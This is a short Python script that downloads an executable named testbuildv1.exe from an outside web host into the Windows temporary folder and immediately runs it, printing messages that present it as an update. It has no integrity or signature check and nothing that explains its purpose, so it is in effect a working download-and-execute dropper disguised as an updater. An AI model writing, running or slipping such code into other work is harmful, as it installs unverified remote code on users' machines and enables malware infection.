import os
import subprocess
import urllib.request

# Define the URL and local path
url = "http://leonboussen.com/subfolder/testbuildv1.exe"
local_path = os.path.join(os.getenv("TEMP"), "testbuildv1.exe")

# Download the file
try:
    print(f"Downloading {url} to {local_path}...")
    urllib.request.urlretrieve(url, local_path)
    print("Download complete.")

    # Execute the downloaded file
    print("Executing the update...")
    subprocess.run([local_path], shell=True, check=True)
    print("Update executed successfully.")
except Exception as e:
    print(f"An error occurred: {e}")
